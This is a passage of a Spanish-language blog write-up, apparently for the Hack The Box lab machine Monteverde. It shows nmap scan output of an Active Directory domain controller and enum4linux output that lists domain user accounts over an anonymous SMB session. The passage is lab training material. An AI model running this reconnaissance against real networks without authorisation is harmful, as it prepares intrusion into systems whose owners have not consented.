&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jan 18 18:57:43 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.172&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.172
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65517&lt;/span&gt; filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSVersionBindReqTCP: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     version
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt;
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2020-01-19 01:11:44Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49775/tcp open  msrpc         Microsoft Windows RPC
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1/18%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5E23AA58%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNSV
SF:ersionBindReqTCP,20,&lt;span class=&#34;s2&#34;&gt;&amp;#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x04bind\0\0\x10\0\x03&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: Host: MONTEVERDE&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: 10m36s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-01-19T01:14:10
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jan 18 19:05:11 2020 -- 1 IP address (1 host up) scanned in 448.85 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;enum4linux&#34;&gt;ENUM4LINUX&lt;/h2&gt;
&lt;p&gt;Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;130
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;131
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;132
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;133
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;134
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;135
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;136
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;137
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;138
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;139
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;140
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;141
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;142
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;143
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;144
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;145
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;146
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;147
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;148
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;149
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;150
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;151
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;152
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;153
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;154
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;155
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;156
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;157
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;158
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;159
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;160
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;161
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;162
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;163
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;164
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;165
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;166
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;167
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;168
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;169
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;170
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;171
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;172
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;173
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;174
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;175
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;176
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;177
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;178
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;179
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;180
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;181
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;182
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;183
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;184
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;185
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;186
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;187
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;188
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;189
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;190
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;191
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;192
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;193
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;194
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;195
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;196
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;197
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;198
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;199
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;200
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;201
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;202
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;203
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;204
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;205
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;206
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;207
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;208
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;209
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;210
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;211
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;212
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;213
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;214
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;215
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;216
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;217
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;218
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;219
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;220
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;221
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;222
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting enum4linux v0.8.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; on Sat Jan &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 19:15:47 &lt;span class=&#34;nv&#34;&gt;2020&lt;/span&gt;

 &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Target Information    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Password ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, &lt;span class=&#34;nv&#34;&gt;none&lt;/span&gt;


 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Enumerating Workgroup/Domain on 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find workgroup/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================================ 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Nbtstat Information for 10.10.10.172    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================================ 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Looking up status of 10.10.10.172
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;No reply from 10.10.10.172
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Session Check on 10.10.10.172    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Server 10.10.10.172 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got domain/workgroup name: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =========================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Getting domain SID for 10.10.10.172    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =========================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Domain Name: MEGABANK
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Domain Sid: S-1-5-21-391775091-850290835-3566037492
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Host is part of a domain (not a workgroup)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ====================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    OS information on 10.10.10.172    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ====================================== 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got OS info for 10.10.10.172 from smbclient: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got OS info for 10.10.10.172 from srvinfo:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Users on 10.10.10.172    |
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================= 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O&amp;#39;&lt;/span&gt;Leary	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Guest&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f5&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;AAD_987d7f2f57d2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x450&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mhope&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x641&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SABatchJobs&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-ata&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-bexec&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-netapp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
